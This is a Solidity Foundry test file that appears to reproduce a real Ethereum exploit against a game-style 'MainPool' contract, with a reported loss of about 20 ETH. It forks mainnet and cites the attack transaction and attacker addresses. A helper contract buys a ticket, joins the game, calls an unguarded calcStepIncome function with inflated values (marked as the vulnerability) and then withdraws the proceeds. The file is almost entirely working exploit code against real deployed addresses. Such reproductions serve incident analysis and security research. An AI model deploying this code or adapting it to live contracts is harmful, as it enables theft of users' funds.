pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo -- Total Lost : ~20 ETH
// TX : https://phalcon.blocksec.com/explorer/tx/eth/0xcf834aff4de9992f5da9c443600dad9c6277a8a00de5007842fece51564992db
// Attacker : https://etherscan.io/address/0x24a0c66f185874b251eb70bee2c2e35e39848419
// Attack Contract : https://etherscan.io/address/0x2ffdce5f0c09a8ee3a568bc01f35894b2d77a6d6
// GUY : https://x.com/EXVULSEC/status/1753294675971313790

interface Ticket is IERC20{
 function buyADC() external payable;
 function getRID() external view returns(uint256 rid_);

}

interface MainPool {
    struct Player{
        //uint256 pID;
        uint256 ticketInCost;     // how many eth can join
        uint256   withdrawAmount;     // how many eth can join
        uint256 startTime;      // join the game time
        uint256 totalSettled;   // rturn  funds
        uint256 staticIncome;
        uint256 lastCalcSITime;      // last Calc staticIncome Time  
        //uint256 lastCalcDITime; //  last Calc dynamicIncome Time
        uint256 dynamicIncome; //  last Calc dynamicIncome
        uint256 stepIncome;
        bool isActive; // 1 mean is 10eth,2 have new one son,3,
        bool isAlreadGetIns;// already get insePoolBalance income;
    }
    function joinGame(address parentAddr) external payable ;
    function calcStepIncome(uint256 pid_,uint256 value_,uint8 dividendAccount_) external;
    function withdraw() external;
    function getMainPoolWithdrawBalance(uint256 index) external view returns (uint256);
    function getRID() external view returns(uint256 rid_);
    function mainPoolWithdrawBalance(uint256 index) external view returns (uint256);
    function plyr(uint256 rid, uint256 pid) external view returns (Player memory);
    function plyrID(address _add) external view returns (uint256);

}
contract Exploit is Test{
    IBalancerVault Balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    Ticket tick=Ticket(0xaE2C7af5fc2dDF45e6250a4C5495e61afC7AcF50);
    MainPool mainpool=MainPool(0xdE46fcF6aB7559E4355b8eE3D7fBa0f2730CDdd8);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    IWETH private constant WETH =IWETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    IERC20 AAVEETH=IERC20(0x0B925eD163218f6662a35e0f0371Ac234f9E9371);
    IUSDC private constant USDC =IUSDC(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IUniswapV2Router UniRouter = IUniswapV2Router(payable(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D));
    event TokensBought(uint256 amount);
    IAaveFlashloan AAVE = IAaveFlashloan(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
    Help Helper;
    function setUp() public{
        cheats.createSelectFork("mainnet", 19138640); 
    }

    function testexploit() public payable{
        Helper= new Help{value: 18 ether}();

        WETH.approve(address(mainpool), 18 ether);
        WETH.approve(address(tick), 18 ether);
        WETH.approve(address(Helper), 18 ether);

        Helper.startwith();
        emit log_named_decimal_uint(
            "Attacker WETH balance after exploit",
            address(Helper).balance,
            18
        );
    }
    fallback() external payable {
    }
}

contract Help is Test{

    Ticket tick=Ticket(0xaE2C7af5fc2dDF45e6250a4C5495e61afC7AcF50);
    MainPool mainpool=MainPool(0xdE46fcF6aB7559E4355b8eE3D7fBa0f2730CDdd8);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    IWETH  WETH =
        IWETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    
    constructor() public payable{
        emit log_named_decimal_uint(
            "Attacker WETH balance before exploit",
            address(this).balance,
            18
        );
        tick.buyADC{value:3 ether}();
        mainpool.joinGame{value:15 ether}(address(msg.sender));
        //vulnerability.
        mainpool.calcStepIncome(529, 36099999999999999900, 100);
    }
    function startwith()external {
        mainpool.withdraw();
    }
    fallback() external payable {
    }

}
